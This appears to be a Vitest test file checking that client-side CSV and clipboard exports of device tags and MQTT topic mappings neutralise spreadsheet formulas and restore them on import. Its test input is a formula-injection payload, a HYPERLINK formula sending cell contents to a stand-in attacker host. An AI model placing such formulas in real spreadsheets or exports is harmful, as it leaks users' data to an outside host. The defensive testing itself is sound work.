import { describe, it, expect } from 'vitest';
import { neutralizeFormula, restoreFormula } from '@/lib/csvSafe';
import { serializeTags, parseTags } from '@/lib/deviceTags';
import { newState } from '@/pages/tags/mappingModel';
import { rowsToCsv, applyCsv } from '@/pages/tags/csvRows';

// Topic names, OPC UA browse names and device tag names reach these client-side exports from the
// network. A cell a spreadsheet would run as a formula must not be one when the file is opened.
const HOSTILE = '=HYPERLINK("http://evil.example/?"&A1,"click")';

describe('spreadsheet formula injection in client-side CSV exports', () => {
  it('neutralises text starting with = + - @ tab or CR, leaves numbers and plain text alone, and round trips', () => {
    for (const s of [HOSTILE, '+cmd', '-2+3', '@SUM(A1)', '\tx', '\rx']) {
      expect(neutralizeFormula(s)).toBe(`'${s}`);
      expect(restoreFormula(neutralizeFormula(s))).toBe(s);
    }
    expect(neutralizeFormula('-5')).toBe('-5');
    expect(neutralizeFormula('1e3')).toBe('1e3');
    expect(neutralizeFormula('plant/line1')).toBe('plant/line1');
    expect(neutralizeFormula(7)).toBe(7);
    expect(restoreFormula("'plain")).toBe("'plain"); // an apostrophe the user wrote stays
  });

  it('device tag CSV and clipboard text: a hostile tag name is not a formula, and import gives it back', () => {
    const tags = [{ key: HOSTILE, address: '@40001', description: '+1 555', scale: -2 }];
    for (const delim of [',', '\t']) {
      const text = serializeTags(tags, delim);
      const cells = text.split('\n')[1];
      expect(cells.startsWith('"\'=HYPERLINK') || cells.startsWith("'=HYPERLINK")).toBe(true);
      expect(cells).toContain("'@40001");
      expect(cells).toContain('-2');
      expect(cells).not.toContain("'-2");
      const back = parseTags(text, delim).tags[0];
      expect(back.key).toBe(HOSTILE);
      expect(back.address).toBe('@40001');
      expect(back.description).toBe('+1 555');
      expect(back.scale).toBe(-2);
    }
  });

  it('mapping CSV: a hostile MQTT topic address is not a formula, and import updates the same row', () => {
    const s = newState({ srcType: 'mqtt', ref: { brokerId: 'b1' }, picked: [], brokers: [{ id: 'b1', name: 'B' }] });
    const imported = applyCsv(s, `address,name\n"${HOSTILE.replace(/"/g, '""')}",x\n`);
    expect(imported.errors).toEqual([]);
    const csv = rowsToCsv(imported.rows, 'mqtt');
    const line = csv.split('\n')[1];
    expect(line.startsWith('"\'=HYPERLINK')).toBe(true);
    const again = applyCsv({ ...s, rows: imported.rows }, csv);
    expect(again.errors).toEqual([]);
    expect(again.updated).toBe(1);
    expect(again.added).toBe(0);
    expect(again.rows[0].address).toBe(HOSTILE);
  });
});
